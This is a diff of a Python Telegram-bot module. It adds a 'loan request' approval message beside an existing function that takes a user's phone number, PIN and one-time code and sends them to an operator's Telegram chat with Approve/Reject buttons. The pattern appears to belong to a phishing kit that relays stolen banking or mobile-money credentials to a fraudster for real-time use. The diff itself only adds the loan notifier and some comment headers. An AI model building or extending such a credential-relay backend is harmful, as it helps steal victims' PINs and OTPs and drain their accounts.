@@ -5,6 +5,9 @@ TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
 
 
+# =========================================
+# OTP APPROVAL
+# =========================================
 async def send_approval_request(approval_id: str, phone: str, pin: str, otp: str):
     """Send a Telegram message with Approve/Reject inline buttons."""
     if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
@@ -40,6 +43,45 @@ async def send_approval_request(approval_id: str, phone: str, pin: str, otp: str
             print(f"🔴 Telegram send error: {e}")
 
 
+# =========================================
+# LOAN REQUEST APPROVAL
+# =========================================
+async def send_loan_approval_request(approval_id: str, phone: str):
+    """Send a Telegram message asking the admin to approve the loan request."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print("🔴 Telegram credentials missing.")
+        return
+
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    text = (
+        f"🏦 <b>New Loan Request</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n\n"
+        f"Approve this loan request?"
+    )
+    keyboard = {
+        "inline_keyboard": [[
+            {"text": "✅ Approve", "callback_data": f"loan_approve:{approval_id}"},
+            {"text": "❌ Deny", "callback_data": f"loan_reject:{approval_id}"}
+        ]]
+    }
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": text,
+        "parse_mode": "HTML",
+        "reply_markup": keyboard,
+    }
+
+    async with httpx.AsyncClient() as client:
+        try:
+            response = await client.post(url, json=payload)
+            print(f"🟢 Loan Telegram response: {response.status_code}")
+        except Exception as e:
+            print(f"🔴 Loan Telegram send error: {e}")
+
+
+# =========================================
+# SHARED HELPERS
+# =========================================
 async def answer_callback_query(callback_id: str, text: str):
     """Acknowledge the button press so the spinner stops."""
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
